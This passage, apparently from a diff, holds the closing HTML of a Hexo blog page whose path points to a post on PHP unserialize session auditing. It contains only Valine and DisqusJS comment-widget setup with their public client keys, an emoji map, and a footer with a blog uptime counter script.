class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target="#valine-container" onclick="showComment(this.dataset.target)">valine</a><style>#disqus_thread {
+  display: none;
+}</style><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target="#disqus_thread" onclick="showComment(this.dataset.target)">disqusjs</a><script>function hideAllComment() {
+  //- hide all
+  document.querySelectorAll('.toggle-comment-btn').forEach((btn) => {
+    const container = document.querySelector(btn.dataset.target);
+    if (container) {
+      container.style.display = "none";
+    }
+  });
+}
+function showComment(target) {
+  hideAllComment();
+  //- show target
+  const targetContainer = document.querySelector(target);
+  if (targetContainer) {
+    targetContainer.style.display = "block";
+  }
+}
+</script></div><div id="disqus_thread"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@latest/dist/disqusjs.css"><script src="https://cdn.jsdelivr.net/npm/disqusjs@latest/dist/disqus.js"></script><script>const disqusjsConfig = {"enable":true,"shortname":"yunyoujun","apikey":"ouoGQCaamOKdJgyZU5DKcpFnRIg3SNzvk0nwygPtlcTRJuE68c8igvrZGW4wAJoN"}
+function loadDisqus() {
+  const dsqjs = new DisqusJS(disqusjsConfig)
+}</script><script src="/js/comments/disqus.js"></script><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
+  const valineConfig = {"enable":true,"appId":"4x0IwQ1sy95mOGQDTO8MYCeA-gzGzoHsz","appKey":"9loqwF3UDklPDHaP9IN2uwN8","placeholder":"大佬求指教&nbsp_(:з」∠)_ （填写邮箱可以收到回复通知～）","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"serverURLs":"https://lncld.yunyoujun.cn","requiredFields":["nick","mail"],"emojiCDN":"//i0.hdslb.com/bfs/emote/","emojiMaps":{"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_亲亲":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_偷笑":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_再见":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_冷漠":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_发怒":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_发财":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_可爱":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_吐血":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_呆":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_呕吐":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_困":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_坏笑":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_大佬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_大哭":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_委屈":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_害羞":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_尴尬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_微笑":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_思考":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_惊吓":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png","tv_打脸":"56ab10b624063e966bfcb76ea5dc4794d87dfd47.png","tv_抓狂":"fe31c08edad661d63762b04e17b8d5ae3c71a757.png","tv_抠鼻":"c666f55e88d471e51bbd9fab9bb308110824a6eb.png","tv_斜眼笑":"911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png","tv_无奈":"ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png","tv_晕":"5443c22b4d07fb1907ccc610c8e6db254f2461b7.png","tv_流汗":"cead1c351ab8d79e9f369605beb90148db0fbed3.png","tv_流泪":"7e71cde7858f0cd50d74b0264aa26db612a8a167.png","tv_流鼻血":"c32d39db2737f89b904ca32700d140a9241b0767.png","tv_点赞":"f85c354995bd99e28fc76c869bfe42ba6438eff4.png","tv_生气":"26702dcafdab5e8225b43ffd23c94ac1ff932654.png","tv_生病":"8b0ec90e6b86771092a498c54f09fc94621c1900.png","tv_疑问":"0793d949b18d7be716078349c202c15ff166f314.png","tv_白眼":"c1d59f439e379ee50eef488bcb5e5378e5044ea4.png","tv_皱眉":"72ccad6679fea0d14cce648b4d818e09b8ffea2d.png","tv_目瞪口呆":"0b8cb81a68de5d5365212c99375e7ace3e7891b7.png","tv_睡着":"8b196675b53af58264f383c50ad0945048290b33.png","tv_笑哭":"1abc628f6d4f4caf9d0e7800878f4697abbc8273.png","tv_腼腆":"89712c0d4af73e67f89e35cbc518420380a7f6f4.png","tv_色":"61822c7e9aae5da76475e7892534545336b23a6f.png","tv_调侃":"4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png","tv_调皮":"b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png","tv_鄙视":"6e72339f346a692a495b123174b49e4e8e781303.png","tv_闭嘴":"c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png","tv_难过":"87f46748d3f142ebc6586ff58860d0e2fc8263ba.png","tv_馋":"fc7e829b845c43c623c8b490ee3602b7f0e76a31.png","tv_鬼脸":"0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png","tv_黑人问号":"45821a01f51bc867da9edbaa2e070410819a95b2.png","tv_鼓掌":"1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"},"el":"#valine-container","lang":"zh-cn"}
+  valineConfig.path = "/2019/05/16/web-security/php-code-audit/php-unserialzie-session/"
+  new Valine(valineConfig)
+}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">greetdawn</a></div><div class="copyright"><span>&copy; 2018 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> 丨Mr.zhang丨</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.4.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.2</span></div><div class="live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2019-04-12T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
+</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>
